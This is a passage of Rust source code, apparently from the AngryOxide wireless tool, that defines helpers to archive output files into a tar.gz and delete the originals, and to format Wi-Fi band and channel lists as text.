            "AngryOxide did not collect any results. 😔 Try running longer, or check your interface?"
        );
    }
}

fn tar_and_compress_files(output_files: Vec<String>, filename: &str) -> io::Result<()> {
    let tgz = File::create(format!("{}.tar.gz", filename))?;
    let enc = GzEncoder::new(tgz, Compression::default());
    let mut tar = Builder::new(enc);

    for path in &output_files {
        let mut file = File::open(path)?;
        tar.append_file(path, &mut file)?;
    }

    tar.into_inner()?;

    // Delete original files after they are successfully added to the tarball
    for path in &output_files {
        if let Err(e) = fs::remove_file(path) {
            eprintln!("Failed to delete file {}: {}", path, e);
        }
    }

    Ok(())
}

fn format_channels(channels: &Vec<(u8, u8)>) -> String {
    let mut band_map: HashMap<u8, Vec<u8>> = HashMap::new();

    // Group by band
    for &(band, channel) in channels {
        band_map.entry(band).or_insert_with(Vec::new).push(channel);
    }

    // Sort channels within each band
    for channels in band_map.values_mut() {
        channels.sort();
    }

    // Collect and format the string
    let mut parts: Vec<String> = Vec::new();
    for (&band, channels) in &band_map {
        let channels_str = channels
            .iter()
            .map(|channel| channel.to_string())
            .collect::<Vec<_>>()
            .join(", ");
        parts.push(format!("Band {}: {}", band, channels_str));
    }

    // Sort the bands for consistent ordering
    parts.sort();

    // Join all parts into a single string
    parts.join(" | ")
}
